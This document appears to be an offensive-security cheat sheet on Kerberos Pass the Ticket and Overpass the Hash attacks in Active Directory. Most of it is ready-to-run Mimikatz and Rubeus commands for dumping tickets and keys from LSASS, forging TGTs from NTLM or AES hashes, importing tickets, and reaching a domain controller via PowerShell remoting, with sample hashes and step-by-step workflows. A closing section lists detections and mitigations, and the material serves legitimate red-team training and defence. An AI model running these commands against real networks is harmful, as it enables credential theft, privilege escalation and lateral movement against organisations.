# Pass the Ticket (PTT) and Overpass the Hash

Use stolen Kerberos tickets or password hashes to authenticate and move laterally in Active Directory environments.
These techniques leverage Kerberos authentication mechanisms for stealthy lateral movement.

## Quick Reference

```cmd
# Extract all tickets with Mimikatz
mimikatz.exe sekurlsa::tickets /export

# Pass the Ticket with Rubeus
Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA...

# Overpass the Hash (forge TGT with NTLM)
mimikatz.exe sekurlsa::pth /domain:blackwood.com /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
```

## Extract Kerberos Tickets

### Mimikatz - Export All Tickets

```cmd
.\mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```

### Rubeus - Dump TGTs

```cmd
# Dump TGTs only
Rubeus.exe dump /service:krbtgt > rubeus_dump_krbtgt.txt

# Dump all tickets (TGTs + TGS)
Rubeus.exe dump /nowrap
```

### Rubeus - Filter by User or LogonID

```cmd
# Filter by specific user
Rubeus.exe dump /user:USERNAME /nowrap

# Filter by LogonID (requires elevation)
Rubeus.exe dump /luid:0xA1234 /nowrap
```

## Overpass the Hash (Pass the Key)

### Mimikatz - Extract Kerberos Keys

```cmd
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
```

Example output:

```
Key List :
  aes256_hmac       b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60
  rc4_hmac_nt       3f74aa8f08f712f09cd5177b5c1ce50f
  rc4_hmac_old      3f74aa8f08f712f09cd5177b5c1ce50f
  rc4_md4           3f74aa8f08f712f09cd5177b5c1ce50f
```

### Mimikatz - Forge TGT with key

```cmd
mimikatz # sekurlsa::pth /domain:blackwood.com /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
```

This creates a new cmd.exe window with the forged TGT.

### Rubeus - Forge TGT with AES256 Key

```cmd
Rubeus.exe asktgt /domain:blackwood.com /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```

### Rubeus - Forge and Import TGT

```cmd
Rubeus.exe asktgt /domain:blackwood.com /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```

## Pass the Ticket

### Rubeus - Import Ticket File

```cmd
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-blackwood.com.kirbi
```

### Rubeus - Import Base64 Ticket

```cmd
Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/Vh...
```

### Mimikatz - Import Ticket

```cmd
mimikatz # privilege::debug
mimikatz # kerberos::ptt "C:\Users\plaintext\Desktop\[0;6c680]-2-0-40e10000-plaintext@krbtgt-blackwood.com.kirbi"
```

### Mimikatz - Launch New CMD with Ticket

```cmd
mimikatz # misc::cmd
```

## Convert Ticket Formats

### Convert .kirbi to Base64

```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-blackwood.com.kirbi"))
```

## PowerShell Remoting with PTT

### Mimikatz - Import Ticket for Remoting

```cmd
mimikatz # kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-BLACKWOOD.HTB.kirbi"
mimikatz # exit
```

### Rubeus - Create Sacrificial Process

```cmd
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

This prevents erasure of existing TGTs for the current logon session.

### Enter PowerShell Remoting Session

```powershell
Enter-PSSession -ComputerName DC01
[DC01]: PS C:\Users\john\Documents> whoami
Blackwood\john
[DC01]: PS C:\Users\john\Documents> hostname
DC01
```

## Common Workflows

### Ticket Extraction and Reuse

1. Compromise system with elevated privileges
2. Extract all Kerberos tickets with Mimikatz or Rubeus
3. Identify high-value tickets (Domain Admin, Enterprise Admin)
4. Import ticket on attacker system
5. Access resources as ticket owner

### Overpass the Hash Attack

1. Dump NTLM hashes or Kerberos keys with Mimikatz
2. Use sekurlsa::pth or Rubeus asktgt to forge TGT
3. New shell opens with valid Kerberos ticket
4. Access domain resources without cleartext password

### Cross-System Ticket Reuse

1. Extract ticket from System A
2. Convert to base64 if needed
3. Transfer to System B
4. Import ticket with Rubeus or Mimikatz
5. Access resources from System B as original user

## Notes

### Ticket Types

**TGT (Ticket Granting Ticket)**:
- Issued by KDC after initial authentication
- Used to request service tickets (TGS)
- Valid for 10 hours by default
- Renewable for up to 7 days

**TGS (Ticket Granting Service)**:
- Service-specific ticket
- Requested using TGT
- Grants access to specific service
- Valid for 10 hours by default

### Mimikatz vs Rubeus for Overpass the Hash

**Mimikatz sekurlsa::pth**:
- Requires administrative privileges
- Creates new process with ticket
- Modifies LSASS memory

**Rubeus asktgt**:
- Does not require administrative privileges
- Requests ticket from KDC
- Cleaner, less invasive approach
- Can use /ptt flag to auto-import

### Ticket Storage Locations

Tickets are stored in:
- LSASS memory (requires SYSTEM/Admin to extract)
- User's credential cache
- Kerberos ticket cache

### PowerShell Remoting Requirements

To use PowerShell Remoting with PTT:
- Administrative permissions on target, OR
- Membership in Remote Management Users group, OR
- Explicit PowerShell Remoting permissions

### Rubeus createnetonly

Creates a sacrificial process with `runas /netonly` behavior:
- Prevents erasure of existing TGTs
- Isolates ticket to new process
- Useful for maintaining multiple ticket contexts

### Detection and Mitigation

**Detection**:
- Monitor for unusual Kerberos ticket requests
- Alert on ticket extraction tools (Mimikatz, Rubeus)
- Track lateral movement via Kerberos
- Monitor for TGT requests from unusual sources
- Alert on privilege::debug in Mimikatz

**Mitigation**:
- Enable Credential Guard to protect LSASS
- Implement Protected Users security group
- Use short ticket lifetimes
- Require PAC validation
- Monitor for anomalous Kerberos activity
- Implement tiered administrative model
- Use smart cards for privileged accounts

### Ticket Lifetime Considerations

Default ticket lifetimes:
- TGT: 10 hours (renewable for 7 days)
- TGS: 10 hours

Stolen tickets remain valid until expiration. Shorter lifetimes reduce attack window but may impact usability.

### Key Types and Encryption

**RC4 (rc4_hmac_nt)**:
- Equivalent to NTLM hash
- Weaker encryption
- Faster to crack if captured

**AES256 (aes256_hmac)**:
- Stronger encryption
- Preferred for security
- Requires domain functional level 2008+

### Related Techniques

- Golden Ticket (forge TGT with krbtgt hash)
- Silver Ticket (forge TGS with service account hash)
- Diamond Ticket (modified Golden Ticket)
- Pass the Certificate
- Kerberos delegation attacks
